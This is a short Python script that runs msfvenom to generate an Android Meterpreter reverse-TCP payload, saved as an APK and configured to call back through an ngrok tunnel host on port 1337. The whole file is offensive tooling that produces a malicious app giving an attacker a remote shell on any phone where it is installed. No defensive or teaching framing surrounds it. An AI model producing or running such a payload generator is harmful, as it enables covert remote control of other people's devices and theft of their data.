#!/usr/bin/env python3

import subprocess
import os

# === CONFIGURE ME ===
LHOST = "0.tcp.ngrok.io"   # your ngrok URL or public IP
LPORT = "1337"           # edit to reflect your ngrok tunnel output     
OUTPUT = "adb_payload.apk"
PAYLOAD = "android/meterpreter/reverse_tcp"

def generate():
    print(f"\n[✓] Using msfvenom to generate {PAYLOAD} payload...\n")
    
    cmd = [
        "msfvenom",
        "-p", PAYLOAD,
        f"LHOST={LHOST}",
        f"LPORT={LPORT}",
        "-o", OUTPUT
    ]
    
    subprocess.run(cmd)

    if os.path.exists(OUTPUT):
        print(f"\n[✓] Payload saved as: {OUTPUT}\n")
    else:
        print("\n[!] Payload generation failed.\n")

if __name__ == "__main__":
    generate()
